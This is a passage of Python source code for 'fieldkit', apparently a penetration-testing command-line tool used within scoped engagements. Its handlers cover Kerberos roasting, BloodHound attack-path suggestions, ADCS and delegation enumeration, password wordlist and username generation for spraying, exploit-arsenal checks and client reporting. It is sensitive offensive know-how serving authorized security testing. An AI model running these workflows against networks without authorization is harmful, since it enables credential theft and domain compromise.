        try:
            ans = input(prompt).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            return "stop"
        if ans in ("s", "skip"):
            return "skip"
        if ans in ("q", "quit", "stop"):
            return "stop"
        return "go"

    def _render(chain, step, outcome):
        marker = {"ok": "  ok ", "manual": " man ", "skip": "skip ",
                  "fail": "FAIL "}[outcome.kind]
        print(f"    {marker} {step.name}  {outcome.evidence}")

    chain_mod.walk(ch, _Ctx(), on_step=_render, before_step=_before)
    store.finalize_chain(args.chain_id, ch)
    total_cost = ch.total_detection_cost
    print(f"\nchain #{args.chain_id}  status={ch.status}  "
          f"detection cost so far = {total_cost}")
    if ch.aborted_reason:
        print(f"aborted: {ch.aborted_reason}")
        return 1
    if ch.status == "in_progress":
        return 1
    return 0


def _render_chain_html(row, trail):
    """Render one chain as a standalone HTML fragment — inline-styled
    so it renders in any browser without external assets, and safe
    to embed in a report or share as a paste. Auto-escapes user-
    supplied strings (profile / target / evidence).

    Same visual shape as the ASCII visual: profile header, per-step
    boxes with outcome markers + costs + evidence, running-total
    line. Colors match the fieldkit brand palette.
    """
    import html as _html

    def esc(s):
        return _html.escape(str(s or ""))

    STATUS_COLORS = {
        "proven":      ("#3d9970", "chain complete"),
        "in_progress": ("#ff9b1f", "chain still in progress"),
        "aborted":     ("#e74c3c", "chain aborted"),
    }
    OUTCOME_COLORS = {
        "ok":     "#3d9970",
        "manual": "#ff9b1f",
        "skip":   "#7a7a7a",
        "fail":   "#e74c3c",
    }
    status_color, status_label = STATUS_COLORS.get(
        row["status"], ("#7a7a7a", row["status"]))

    steps_html = []
    running = 0
    for i, t in enumerate(trail):
        running += t["detection_cost"]
        outcome_color = OUTCOME_COLORS.get(t["outcome_kind"], "#7a7a7a")
        evidence = esc((t["evidence"] or "").strip())
        if len(evidence) > 200:
            evidence = evidence[:197] + "…"
        arrow = ("<div style='color:#7a7a7a;font-family:monospace;"
                 "text-align:center;line-height:1'>↓</div>") if i > 0 else ""
        steps_html.append(f"""
    {arrow}
    <div style="border-left:4px solid {outcome_color};
                background:#1a1a1a;color:#ddd;padding:8px 12px;
                margin:2px 0;font-family:'SF Mono',Menlo,Consolas,monospace;
                font-size:13px;">
      <div>
        <span style="color:{outcome_color};font-weight:bold;">
          [{esc(t["outcome_kind"])}]
        </span>
        <span style="margin-left:8px;font-weight:bold;">
          {esc(t["step_name"])}
        </span>
        <span style="float:right;color:#7a7a7a;">
          cost={t["detection_cost"]} · running={running}
        </span>
      </div>
      {f'<div style="color:#999;font-size:12px;margin-top:4px;">'
       f'{evidence}</div>' if evidence else ''}
    </div>""")

    aborted_line = ""
    if row["aborted_reason"]:
        aborted_line = (f'<div style="color:#e74c3c;font-size:13px;'
                        f'margin-top:6px;">aborted: '
                        f'{esc(row["aborted_reason"])}</div>')

    return f"""<div style="max-width:800px;margin:16px 0;
              padding:16px;background:#0f0f0f;border-radius:6px;
              color:#ddd;font-family:sans-serif;">
  <div style="border-bottom:1px solid #333;padding-bottom:8px;
              margin-bottom:12px;">
    <div style="font-size:16px;font-weight:bold;">
      chain #{row["id"]}:
      <span style="color:#ff9b1f;">{esc(row["profile"])}</span>
      →
      <span style="color:#4a9eff;">{esc(row["target"])}</span>
    </div>
    <div style="color:#999;font-size:13px;margin-top:4px;">
      status =
      <span style="color:{status_color};font-weight:bold;">
        {esc(status_label)}
      </span>
      · detection debt = {row["total_detection_cost"]}
    </div>
    {aborted_line}
  </div>
  {"".join(steps_html)}
</div>
"""


@needs_engagement
def cmd_chain_export(args, store):
    """Dump one recorded chain as JSON. Shape matches what
    report.py's chain-history collector produces: id / profile /
    target / status / detection_debt / aborted_reason /
    started_at / finished_at / total step count + per-step
    trail (name / kind / outcome / cost / evidence / ran_at).

    Output goes to stdout by default; --out writes to a file.
    Read-only.
    """
    row = store.chain_by_id(args.chain_id)
    if row is None:
        _err(f"no chain #{args.chain_id} in this engagement")
        return 2
    trail = store.chain_step_trail(args.chain_id)
    payload = {
        "id": row["id"],
        "profile": row["profile"],
        "target": row["target"],
        "status": row["status"],
        "detection_debt": row["total_detection_cost"],
        "aborted_reason": row["aborted_reason"] or "",
        "started_at": row["started_at"] or "",
        "finished_at": row["finished_at"] or "",
        "steps": [{
            "idx": t["idx"],
            "name": t["step_name"],
            "kind": t["step_kind"],
            "outcome": t["outcome_kind"],
            "cost": t["detection_cost"],
            "evidence": t["evidence"] or "",
            "ran_at": t["ran_at"] or "",
        } for t in trail],
    }
    import json as _json
    text = _json.dumps(payload, indent=2)
    if args.out:
        with open(args.out, "w") as fh:
            fh.write(text + "\n")
        print(f"wrote {args.out}  (chain #{row['id']}, "
              f"{len(trail)} step(s))")
    else:
        print(text)
    return 0


@needs_engagement
def cmd_chain_visual(args, store):
    """Render a text kill-chain visualization of one walked chain.

    Compact operator's-eye view: profile → target header, then one
    line per step showing the outcome marker, step name, cost, and
    ASCII flow arrows between steps. Verbose text version of what
    a full Textual kill-chain widget would render — same information,
    no dependency on Textual scope.

    ``--html`` emits an inline-styled HTML block instead of ASCII —
    embeddable in a report or shareable as a standalone page.
    """
    row = store.chain_by_id(args.chain_id)
    if not row:
        _err(f"no chain #{args.chain_id} in this engagement")
        return 2
    trail = store.chain_step_trail(args.chain_id)
    if not trail:
        print(f"chain #{args.chain_id} recorded but no steps walked yet")
        return 0

    if getattr(args, "html", False):
        html = _render_chain_html(row, trail)
        if args.out:
            with open(args.out, "w") as fh:
                fh.write(html)
            print(f"wrote {args.out}  (chain #{row['id']}, "
                  f"{len(trail)} step(s))")
        else:
            print(html)
        return 0

    # Outcome-to-marker mapping — keeps the box characters ASCII so
    # the visual renders correctly in every terminal (no unicode
    # dependency issues on Windows cmd or older SSH clients).
    markers = {
        "ok":     "[+]",
        "manual": "[?]",
        "skip":   "[-]",
        "fail":   "[X]",
    }
    print()
    print(f"  ┌─ chain #{row['id']}: {row['profile']} → {row['target']}")
    print(f"  │  status = {row['status']}    "
          f"detection debt = {row['total_detection_cost']}")
    if row["aborted_reason"]:
        print(f"  │  aborted: {row['aborted_reason'][:70]}")
    print(f"  └{'─' * 60}")
    print()

    # Compute the max name width for aligned rendering.
    max_name = max((len(t["step_name"]) for t in trail), default=20)
    running_cost = 0
    for i, t in enumerate(trail):
        marker = markers.get(t["outcome_kind"], "[?]")
        connector = "│" if i > 0 else " "
        # Vertical connector from previous step down to this one.
        if i > 0:
            print(f"     {connector}")
        running_cost += t["detection_cost"]
        line = (f"     {marker} {t['step_name']:<{max_name}}  "
                f"cost={t['detection_cost']:>2}  "
                f"(running {running_cost:>3})")
        print(line)
        # Wrap the evidence line under it, indented, when it's short
        # enough to be worth showing.
        evidence = (t.get("evidence") or "").strip()
        if evidence:
            if len(evidence) > 65:
                evidence = evidence[:62] + "..."
            print(f"         {evidence}")

    # Terminal punctuation
    print()
    if row["status"] == "proven":
        print(f"     [+] chain complete — {row['total_detection_cost']} units of "
              f"detection debt spent")
    elif row["status"] == "aborted":
        aborted_step = next((t for t in trail
                              if t["outcome_kind"] in ("fail", "skip")),
                             None)
        step_name = aborted_step["step_name"] if aborted_step else "?"
        print(f"     [X] chain aborted at `{step_name}` — see step trail")
    elif row["status"] == "in_progress":
        remaining = "next step pending — call `fieldkit chain run` to advance"
        print(f"     [~] chain still in progress — {remaining}")
    print()

    return 0


@needs_engagement
def cmd_roast(args, store):
    dcs = [h for h in store.hosts() if h["is_dc"]]
    dc_ip = args.dc or (dcs[0]["ip"] if dcs else None)
    if not dc_ip:
        _err("no DC known — mark one with `add hosts --dc`, or pass --dc <ip>")
        return 2
    dc_host = store.host_by_ip(dc_ip)
    if dc_host is None:
        _err(f"{dc_ip} is not in the engagement — add it with `fieldkit add hosts <ip>`")
        return 2
    cred = _domain_credential(store)
    if cred is None:
        _err("roasting needs a domain credential — add one with `fieldkit add cred`")
        return 2
    kinds = {"both": ("kerberoast", "asrep_roast"), "kerberoast": ("kerberoast",),
             "asrep": ("asrep_roast",)}[args.kind]
    principal = creds_mod.Credential.from_row(cred).principal
    if not _confirm(f"roast {', '.join(kinds)} against {dc_ip} as {principal}? "
                    "(read-only Kerberos requests)", args.yes):
        print("aborted — nothing ran")
        return 1
    report = kerberos_mod.run_roast(store, dc_host, cred, kinds=kinds,
                                    on_event=lambda m: print(m))
    if report.aborted:
        _err(report.aborted)
        return 2
    print(f"\nrecovered {_plural(report.recovered, 'roast hash')} into loot"
          + (" — crack offline, then `fieldkit add cred` to re-spray"
             if report.recovered else ""))
    return 0


@needs_engagement
def cmd_bloodhound_import(args, store):
    if not os.path.exists(args.path):
        _err(f"{args.path}: no such file or directory")
        return 2
    try:
        counts = bloodhound_mod.import_graph(store, args.path)
    except ValueError as exc:
        _err(str(exc))
        return 2
    paths = bloodhound_mod.owned_paths(store)
    print(f"imported {counts['nodes']} nodes, {counts['edges']} edges "
          f"({counts['high_value']} high-value)")
    if paths:
        print(f"\n{_plural(len(paths), 'owned principal')} reach a high-value target:")
        for p in paths[:10]:
            print(f"  {p['path']}")
        print("\n`fieldkit analyze` ranks these among the next moves.")
    else:
        print("no owned principal reaches a high-value target yet — "
              "own more credentials (spray/roast) and re-check with `fieldkit analyze`.")
    return 0


@needs_engagement
def cmd_bloodhound_suggest(args, store):
    """For every owned→high-value path the ingested BH graph
    surfaces, suggest the best-fit shipped chain profile + the
    exact `chain launch` command to walk it.

    Read-only. Exit codes:
      * 0 — one or more paths inspected (whether or not any got a
        chain suggestion — an empty path list is not a failure).
      * 2 — no BH graph ingested yet.
    """
    paths = bloodhound_mod.suggest_chains(
        store,
        all_paths=getattr(args, "all_paths", False),
        max_paths_per_start=getattr(args, "max_paths", 5))
    if not paths:
        # Distinguish empty-graph from graph-but-no-paths.
        if not store.bh_nodes():
            _err("no BloodHound graph ingested — "
                 "run `fieldkit bloodhound import <path>` first")
            return 2
        print("no owned principal reaches a high-value target yet — "
              "own more credentials (spray/roast) and re-check.")
        return 0
    print(f"{_plural(len(paths), 'path')} from owned to high-value:\n")
    for p in paths:
        print(f"  ▸ {p['owned']}  →  {p['target']}  "
              f"({p['hops']} hops)")
        print(f"    {p['path']}")
        s = p.get("suggestion")
        if s:
            print(f"    ↳ suggested: `fieldkit chain run "
                  f"{s['profile']} {s['target']}`")
            print(f"      why: {s['rationale']}")
            for alt in (s.get("alternatives") or []):
                print(f"      ↳ {alt['rationale']}")
            matches = p.get("matching_ttps") or []
            if matches:
                print(f"      also check: {len(matches)} TTP(s) "
                      f"match services on this target:")
                for k in matches[:5]:
                    print(f"        - `fieldkit ttps show {k}`")
                if len(matches) > 5:
                    print(f"        - … + {len(matches) - 5} more "
                          f"(`fieldkit ttps list --grep "
                          f"{s['target'].lower().split('.')[0]}`)")
        else:
            print("    ↳ no shipped chain profile fits — walk the "
                  "BH path directly (see `fieldkit bloodhound "
                  "import` output).")
        print()
    return 0


@needs_engagement
def cmd_delegation(args, store):
    dcs = [h for h in store.hosts() if h["is_dc"]]
    dc_ip = args.dc or (dcs[0]["ip"] if dcs else None)
    if not dc_ip:
        _err("no DC known — mark one with `add hosts --dc`, or pass --dc <ip>")
        return 2
    dc_host = store.host_by_ip(dc_ip)
    if dc_host is None:
        _err(f"{dc_ip} is not in the engagement — add it with `fieldkit add hosts <ip>`")
        return 2
    cred = _domain_credential(store)
    if cred is None:
        _err("finding delegation needs a domain credential — add one with `add cred`")
        return 2
    principal = creds_mod.Credential.from_row(cred).principal
    if not _confirm(f"enumerate Kerberos delegation on {dc_ip} as {principal}? "
                    "(nxc --find-delegation, read-only)", args.yes):
        print("aborted — nothing ran")
        return 1
    report = delegation_mod.run_find(store, dc_host, cred, on_event=lambda m: print(m))
    if report.aborted:
        _err(report.aborted)
        return 2
    print(f"\nfound {_plural(report.found, 'delegation')} — "
          "`fieldkit analyze` ranks them, `fieldkit report` writes them up")
    return 0


@needs_engagement
def cmd_adcs_find(args, store):
    dcs = [h for h in store.hosts() if h["is_dc"]]
    dc_ip = args.dc or (dcs[0]["ip"] if dcs else None)
    if not dc_ip:
        _err("no DC/CA known — mark one with `add hosts --dc`, or pass --dc <ip>")
        return 2
    dc_host = store.host_by_ip(dc_ip)
    if dc_host is None:
        _err(f"{dc_ip} is not in the engagement — add it with `fieldkit add hosts <ip>`")
        return 2
    cred = _domain_credential(store)
    if cred is None:
        _err("certipy needs a domain credential — add one with `fieldkit add cred`")
        return 2
    principal = creds_mod.Credential.from_row(cred).principal
    if not _confirm(f"enumerate vulnerable certificate templates on {dc_ip} as "
                    f"{principal}? (certipy find, read-only)", args.yes):
        print("aborted — nothing ran")
        return 1
    report = adcs_mod.run_find(store, dc_host, cred, on_event=lambda m: print(m))
    if report.aborted:
        _err(report.aborted)
        return 2
    print(f"\nfound {_plural(report.found, 'vulnerable template')} — "
          "`fieldkit analyze` ranks them, `fieldkit report` writes them up")
    return 0


@needs_engagement
def cmd_report(args, store):
    # Observations are in the report by default now; --proven-only drops them. (--all is a
    # retired no-op alias — it used to be the way to include observations.)
    cfg = config_mod.load(store)
    engagement, findings = report_mod.build(store, cfg, proven_only=args.proven_only)

    proven = [f for f in findings if f.get("proven", True)]
    errors, warns = report_mod.check(findings)
    if args.check:
        # A --check with zero findings is not a real OK — it's a nothing-to-check.
        # The old "CHECK OK: 0 proven findings" read as green even though nothing
        # had been proven; a tester ran --check before doing any work and got
        # false confidence. Say what actually happened.
        if not findings:
            print("nothing to check — no findings recorded yet. Run "
                  "`fieldkit escalate` / `fieldkit run` to prove a vector first, "
                  "then re-run `fieldkit report --check`.")
            return 1
        for tag, m in errors:
            print(f"  ERROR  [{tag}] {m}")
        for tag, m in warns:
            print(f"  warn   [{tag}] {m}")
        if errors:
            print(f"CHECK FAILED: {len(errors)} error(s), {len(warns)} warning(s).")
            return 2
        print(f"CHECK OK: {_plural(len(proven), 'proven finding')}, "
              f"{len(warns)} warning(s) — every proven finding carries its captured proof.")
        return 0

    if args.cleanup:
        # only proven findings made changes to a target — observations weren't exploited.
        path = f"{args.out}.cleanup.md"
        with open(path, "w") as fh:
            fh.write(report_mod.cleanup_manifest(engagement, proven))
        print(f"wrote {path}  (INTERNAL cleanup manifest — do not send to the client)")
        return 0

    if errors and not args.force:
        for tag, m in errors:
            print(f"  ERROR  [{tag}] {m}")
        _err(f"refusing to render: {_plural(len(errors), 'anti-fabrication error')} "
             "(a proven finding without captured proof). Fix them, or pass --force.")
        return 2

    # Refuse to write empty deliverables. Producing three near-empty files
    # (report.md, report.docx, report.pdf) in CWD before the engagement has any
    # findings just clutters the tester's workspace. --force is the operator
    # opt-in for "yes, write it anyway (I'm checking a template render)".
    if not findings and not args.force:
        _err("nothing to report yet — no findings recorded. Run `fieldkit escalate` "
             "or `fieldkit run` to prove a vector first, or pass --force to write "
             "an empty template.")
        return 1

    formats = [x.strip() for x in args.formats.split(",") if x.strip()]
    md = report_mod.render_markdown(engagement, findings)
    md_path = f"{args.out}.md"
    with open(md_path, "w") as fh:
        fh.write(md)
    obs = len(findings) - len(proven)
    tally = _plural(len(proven), "finding") + (f" + {_plural(obs, 'observation')}" if obs else "")
    print(f"wrote {md_path}  ({tally})")
    for line in report_mod.export(md_path, args.out, formats):
        print(line)
    if not proven:
        print("note: no proven findings yet — run `fieldkit run`/`escalate` to prove vectors "
              "(the report currently holds only observations).")
    if getattr(args, "open", False):
        # Pick the "richest" format that was actually produced:
        # html > pdf > docx > md. Silent no-op when nothing landed.
        picked = _pick_open_path(args.out, formats)
        if picked and os.path.exists(picked):
            rc = _open_file(picked)
            if rc == 0:
                print(f"opened {picked}")
            else:
                print(f"open failed — file is at {picked}")
    return 0


def _pick_open_path(basename, formats):
    """Return the "richest" produced output file to open (html > pdf >
    docx > md). Returns None when only formats are requested that
    don't correspond to a real file on disk (a pandoc-missing hint)."""
    for ext in ("html", "pdf", "docx", "md"):
        if ext in formats:
            path = f"{basename}.{ext}"
            if os.path.exists(path):
                return path
    return None


def _open_file(path):
    """Hand ``path`` to the OS's default file handler. Uses the
    injected runner (rule 2 — no bare subprocess). Best-effort:
    returns 0 on likely-launch, non-zero when no opener is found
    or the runner errors. Never blocks — the opener detaches."""
    if sys.platform == "darwin":
        cmd = ["open", path]
    elif sys.platform.startswith("linux"):
        cmd = ["xdg-open", path]
    elif sys.platform.startswith("win"):
        cmd = ["cmd", "/c", "start", "", path]
    else:
        return 1
    if not shutil.which(cmd[0]):
        return 1
    try:
        res = runner_mod.run(cmd, timeout=5)
    except Exception:                                       # noqa: BLE001
        return 1
    return res.exit_code if res.exit_code is not None else 1


@needs_engagement
def cmd_export_recce(args, store):
    import json
    cfg = config_mod.load(store)
    engagement, findings = report_mod.build(store, cfg, proven_only=not args.all)
    if not findings:
        _err("no proven findings to export — run `fieldkit run` to prove vectors first "
             "(or --all to include unproven)")
        return 2
    payload = bridge_mod.export_payload(engagement, findings)
    dest = args.out or "recce_findings.json"
    with open(dest, "w") as fh:
        json.dump(payload, fh, indent=2)
    print(f"wrote {dest}  ({_plural(len(findings), 'finding')}, KB-enriched for recce)")
    print(f"  fold into the recce workbook + report:  recce fieldkit-import {dest} -o <engagement>")
    return 0


@needs_engagement
def cmd_archive(args, store):
    """Package the engagement into one tarball for handoff / long-term retention."""
    cfg = config_mod.load(store)
    formats = [x.strip() for x in (args.formats or "md,docx,pdf").split(",")
               if x.strip()]
    out_path, bundled, warnings = archive_mod.build_archive(
        store, cfg, out_path=args.out, formats=formats)

    size_kb = os.path.getsize(out_path) / 1024
    print(f"wrote {out_path}  ({size_kb:.1f} KB, "
          f"{_plural(len(bundled), 'file')} bundled)")
    for name in bundled:
        print(f"  {name}")
    for warn in warnings:
        print(f"  ⚠ {warn}")
    print()
    print("this archive is INTERNAL — contains the cleanup manifest, the raw "
          "SQLite state (with recovered hashes/creds), and the full evidence "
          "trail. The client-facing deliverable is report.docx separately.")
    return 0


def cmd_wordlist(args):
    """Generate a targeted wordlist from seed words + inspectable mutation rules."""
    if getattr(args, "rules", False):
        print("wordlist mutation rules (all pure, inspectable):\n")
        for r in wordlist_mod.RULES:
            print(f"  {r.name:<10} {r.description}")
        print("\nseed input:")
        print("  positional args, --from-file <path>, --from-text <text> (any/all)")
        print("\ndefaults:  cases + leet + suffix ON; "
              "prefix/combine/season/walks/wrapped OFF")
        print("presets:   --long  →  min-len 12, max-len 16, walks+wrapped ON "
              "(modern ≥12-char engagement shape)")
        return 0

    seeds = list(args.seeds or [])
    if args.from_file:
        try:
            with open(args.from_file, "r", errors="replace") as fh:
                for line in fh:
                    w = line.strip()
                    if w and not w.startswith("#"):
                        seeds.append(w)
        except OSError as exc:
            _err(f"--from-file {args.from_file}: {exc}")
            return 2
    if args.from_text:
        seeds.extend(wordlist_mod.seeds_from_text(args.from_text))
    # --walks alone produces a standalone list; no seeds required. Same for --long
    # when the operator wants just keyboard walks in the 12-16 band.
    if not seeds and not args.walks and not args.long:
        _err("no seeds — give words as positional args, `--from-file <path>`, "
             "`--from-text \"<about-page copy>\"`, or use `--walks` for a "
             "seedless keyboard-walk list. `fieldkit wordlist --rules` shows "
             "how each seed will be expanded.")
        return 2

    years = args.years or ()
    # --long is a preset for the modern ≥12-char engagement shape the operator
    # described: keyboard walks + phrase wrapped by symbols/numbers, in the
    # 12–16 char band. It layers on top; explicit --min-len/--max-len still win.
    if args.long:
        if not args.walks and not args.wrapped:
            args.walks = args.wrapped = True
        if args.min_len == 6:            # only if operator didn't override
            args.min_len = 12
        if args.max_len == 32:
            args.max_len = 16
    rep = wordlist_mod.generate(
        seeds, years=years, seasons=args.seasons, combine=args.combine,
        walks=args.walks, wrapped=args.wrapped,
        cases=not args.no_cases, leet=not args.no_leet, suffixes=not args.no_suffixes,
        prefixes=args.prefixes, extra_suffixes=args.suffix or (),
        extra_prefixes=args.prefix or (),
        min_len=args.min_len, max_len=args.max_len, max_output=args.max)

    if args.out:
        try:
            with open(args.out, "w") as fh:
                fh.write("\n".join(rep.words) + "\n")
        except OSError as exc:
            _err(f"--out {args.out}: {exc}")
            return 2
        note = " (truncated at --max)" if rep.truncated else ""
        print(f"wrote {args.out}  ({rep.total} words from "
              f"{_plural(len(seeds), 'seed')}; rules: {', '.join(rep.rules)}){note}")
        print(f"  use it: `{PROG} spray --wordlist --passlist {args.out}`")
    else:
        for w in rep.words:
            print(w)
    return 0


def cmd_usernames(args):
    """Generate a username list from first/last name pairs using common schemas."""
    first, last = list(args.first or []), list(args.last or [])
    if args.first_file:
        try:
            with open(args.first_file, "r", errors="replace") as fh:
                first.extend(w.strip() for w in fh
                             if w.strip() and not w.startswith("#"))
        except OSError as exc:
            _err(f"--first-file {args.first_file}: {exc}")
            return 2
    if args.last_file:
        try:
            with open(args.last_file, "r", errors="replace") as fh:
                last.extend(w.strip() for w in fh
                            if w.strip() and not w.startswith("#"))
        except OSError as exc:
            _err(f"--last-file {args.last_file}: {exc}")
            return 2
    if not first or not last:
        _err("need at least one --first and one --last name (or --first-file / "
             "--last-file). E.g.: `fieldkit usernames --first john jane --last "
             "doe smith`")
        return 2
    users = wordlist_mod.usernames(first, last,
                                    patterns=args.patterns or None)
    if args.out:
        try:
            with open(args.out, "w") as fh:
                fh.write("\n".join(users) + "\n")
        except OSError as exc:
            _err(f"--out {args.out}: {exc}")
            return 2
        print(f"wrote {args.out}  ({_plural(len(users), 'username')} from "
              f"{_plural(len(first), 'first')} × {_plural(len(last), 'last')})")
        print(f"  use it: `{PROG} spray --wordlist --userlist {args.out} "
              "--passlist <password-list>`")
    else:
        for u in users:
            print(u)
    return 0


def cmd_arsenal_list(args):
    st = arsenal_mod.staged()
    root = arsenal_mod.arsenal_dir()
    if not st:
        print(f"nothing staged in {root} — run `sh exploits/fetch.sh` on a connected box.")
        return 0
    total = sum(len(v) for v in st.values())
    print(f"staged arsenal ({total} artifacts in {root}):\n")
    for cat, names in st.items():
        print(f"  {cat} ({len(names)})")
        print("    " + ", ".join(names))
    return 0


def cmd_arsenal_find(args):
    p = arsenal_mod.find(args.name)
    if p:
        print(p)
        return 0
    _err(f"{args.name!r} is not staged (checked {arsenal_mod.arsenal_dir()})")
    return 1


def _resolutions():
    out = []
    for key, need in sorted(arsenal_mod.PRIVESC_NEEDS.items()):
        out.append(("privesc", arsenal_mod.resolve(key, need)))
    for key, need in sorted(arsenal_mod.EVASION_NEEDS.items()):
        out.append(("evasion", arsenal_mod.resolve(key, need)))
    return out


def cmd_arsenal_check(args):
    res = _resolutions()
    marks = {arsenal_mod.BUILTIN: "native", arsenal_mod.BUILD: "build",
             arsenal_mod.STAGED: "staged", arsenal_mod.SUPPLIED: "supply"}
    gaps = [(g, r) for g, r in res if not r.ready]
    print("arsenal readiness — what each route needs to fire:\n")
    if args.all:
        for group, r in res:
            flag = "OK " if r.ready else "!! "
            print(f"  {flag}[{marks[r.need.kind]:<6}] {group}:{r.key:<24} {r.detail}")
        print()
    print(f"{_plural(len(gaps), 'gap')} — routes that need an artifact you must stage/supply:")
    if not gaps:
        print("  (none — every mapped route is native, buildable, or already staged)")
    for _, r in gaps:
        print(f"  !! {r.key:<24} {r.need.hint}")
        print(f"       {r.detail}")
    print("\n(build-kind routes are produced by `fieldkit poc`; run with --all for the full map)")
    return 0


def _current_phase(counts):
    """Where in the engagement workflow the state says we are."""
    if not counts["hosts"] and not counts["credentials"]:
        return "setup", f"`{PROG} add hosts <scope>` and `{PROG} add cred <cred>`"
    if not counts["hosts"]:
        return "setup", f"`{PROG} add hosts <scope>`"
    if not counts["credentials"]:
        return "setup", f"`{PROG} add cred <cred>` (or `{PROG} spray --wordlist`)"
    if not counts["access"]:
        return "spraying", f"`{PROG} spray` to validate stored credentials"
    if not counts["findings"]:
        return "enumeration", (
            f"`{PROG} enum <host>` on a Pwn3d host, then `{PROG} analyze`")
    if not counts["proven_findings"]:
        return "exploitation", (
            f"`{PROG} escalate <host> --allow config-change` to prove a vector")
    return "reporting", f"`{PROG} report` and `{PROG} export-recce`"


def _next_moves(store, cfg, limit=3):
    """The top-``limit`` opportunities from analyze, ranked."""
    items = list(kb_mod.analyze(store))
    items += privesc_mod.vectors_from_state(store, **_stage_dirs(cfg))
    items.sort(key=lambda x: -x.score)
    return items[:limit]


def cmd_tui(args):
    """Launch the Textual TUI. The app opens the engagement DB itself so it
    can render "(no engagement)" instead of crashing on a fresh clone.
    """
    from .tui.app import run           # lazy — vendor shim + textual are heavy
    db = args.db if getattr(args, "db", None) else None
    run(db_path=db)
    return 0


@needs_engagement
def cmd_watch(args, store):
    """Stream engagement events as JSONL — one line per new row, forever.

    Consumers (the TUI, or an operator's `jq` pipeline) pass ``--json`` today;
    the flag is reserved for later non-JSON formats. ``--kinds`` narrows the
    stream; ``--from-now`` skips existing rows so a fresh watch doesn't dump the
    full engagement history.

    Ctrl-C exits cleanly with the standard 130. A broken pipe (e.g. `| head`)
    exits 0 — the caller stopped consuming, not fieldkit's problem.
    """
    if not getattr(args, "json", False):
        _err("`watch` requires --json (reserved for future formats)")
        return 2
    kinds = tuple(k.strip() for k in (args.kinds or "").split(",") if k.strip())
    for k in kinds:
        if k not in watch_mod.EVENT_KINDS:
            _err(f"unknown event kind: {k!r} — pick from "
                 f"{','.join(watch_mod.EVENT_KINDS)}")
            return 2

    # honor --from-now: prime cursors to current max ids so we only emit rows
    # that appear after this watch started.
    if args.from_now:
        cursors = {}
        for k in kinds:
            rows = watch_mod._query_after(store, k, 0)
            cursors[k] = rows[-1]["id"] if rows else 0
    else:
        cursors = None

    # emit a header line first so consumers know the wire version + timestamp
    header = {
        "event": "watch_started",
        "watch_version": watch_mod.WATCH_VERSION,
        "kinds": list(kinds),
        "interval": args.interval,
    }
    print(watch_mod.dumps(header), flush=True)

    # a mutable flag we can flip from the signal handler
    running = {"go": True}
    def _stop(*_): running["go"] = False
    try:
        signal.signal(signal.SIGINT, _stop)
        signal.signal(signal.SIGTERM, _stop)
    except (ValueError, AttributeError):  # not on main thread / windows quirks
        pass

    import time as _time
    for event in watch_mod.watch(
            store, cursors=cursors, kinds=kinds,
            sleep=lambda: _time.sleep(args.interval),
            run=lambda: running["go"]):
        try:
            print(watch_mod.dumps(event), flush=True)
        except BrokenPipeError:  # pragma: no cover — `| head` etc.
            return 0
    return 0


@needs_engagement
def cmd_status(args, store):
    row = store.require_engagement()
    cfg = config_mod.load(store)
    counts = store.counts()

    if getattr(args, "json", False):
        # Machine-readable projection. Includes top-3 moves + current phase so
        # a consumer (TUI, external script) has the same information the human
        # status prints, without scraping.
        phase = _current_phase(counts)
        moves = _next_moves(store, cfg) if counts.get("access") else []
        payload = status_json_mod.status_dict(
            store, cfg=cfg, top_moves=moves, phase=phase)
        print(json.dumps(payload, indent=2, sort_keys=True))
        return 0

    print(f"engagement:  {row['name']}   created {row['created']}")
    print(f"database:    {store.path}")
    summary = "  ".join(
        f"{k}={cfg.get(k)}" for k in config_mod.HEADLINE_KEYS if cfg.get(k))
    overrides = cfg.overrides()
    print(f"config:      {summary or '(unset — run `fieldkit config set lhost=…`)'}"
          + (f"   (+{_plural(len(overrides), 'subnet override')})" if overrides else ""))
    scope_rules = store.scope_rules()
    if scope_rules:
        by_kind = {}
        for r in scope_rules:
            by_kind.setdefault(r["kind"], []).append(r["cidr"])
        parts = [f"{k}={','.join(v)}" for k, v in sorted(by_kind.items())]
        print(f"scope:       {' · '.join(parts)}")
    print()

    os_mix = "  ".join(f"{r['os'] or 'unfingerprinted'} {r['n']}"
                       for r in store.host_os_breakdown())
    cred_mix = "  ".join(f"{r['secret_type']} {r['n']}"
                         for r in store.credential_type_breakdown())
    print(f"hosts        {counts['hosts']:>5}   {os_mix}")
    print(f"services     {counts['services']:>5}")
    print(f"credentials  {counts['credentials']:>5}   {cred_mix}")
    print(f"access       {counts['access']:>5}   "
          f"{counts['admin_access']} admin on {_plural(counts['admin_hosts'], 'host')}")
    print(f"findings     {counts['findings']:>5}   {counts['proven_findings']} proven")
    print(f"loot         {counts['loot']:>5}")

    # --- situational board: phase, top-3 next moves, preflight, blockers -----
    phase, phase_hint = _current_phase(counts)
    print(f"\nphase:       {phase}")
    print(f"next:        {phase_hint}")

    # Where am I hot? A tester coming back after a break wants to know THE IPS,
    # not just the count. "3 admin on 3 hosts" hides which ones — this line
    # names them so `enum <ip>` / `escalate <ip>` are one glance away.
    if counts["admin_hosts"]:
        pwned = store.admin_hosts()
        labels = [(f"{h['ip']} ({h['hostname']})" if h["hostname"] else h["ip"])
                  + (" — DC" if h["is_dc"] else "")
                  for h in pwned[:8]]
        more = f" (+{len(pwned) - 8} more)" if len(pwned) > 8 else ""
        print(f"pwned:       {', '.join(labels)}{more}")

    # Show top-3 ranked opportunities when there ARE any (skipped in setup phase
    # to keep the empty-engagement output short).
    if counts["access"]:
        moves = _next_moves(store, cfg)
        if moves:
            print("\ntop moves (ranked):")
            for m in moves:
                where = f" [{m.host}]" if getattr(m, "host", None) else ""
                mark = "manual" if getattr(m, "manual", False) else "run"
                print(f"  {m.axes:<22} {m.title[:56]:<56}{where}  ({mark})")

    # Preflight — surface missing required tools once here so the operator
    # doesn't discover nxc is missing mid-run.
    pf_missing = preflight_mod.missing_required(preflight_mod.check())
    if pf_missing:
        labels = ", ".join(r[0] for r in pf_missing)
        print(f"\n⚠ required tools missing: {labels} — "
              f"`{PROG} preflight` for the full list")

    if args.hosts:
        print("\nhosts:")
        for host in store.hosts():
            print(f"  {host['ip']:<39} {host['hostname'] or '':<20} "
                  f"{host['os'] or '':<8} {host['subnet'] or ''}"
                  + ("  DC" if host["is_dc"] else ""))
    if args.creds:
        print("\ncredentials:")
        for row in store.credentials():
            cred = creds_mod.Credential.from_row(row)
            print(f"  {cred.principal:<32} {cred.secret_type:<9} source={row['source']}")
    return 0


# -------------------------------------------------------------------------- parser

def _add_chain_ctx_args(parser):
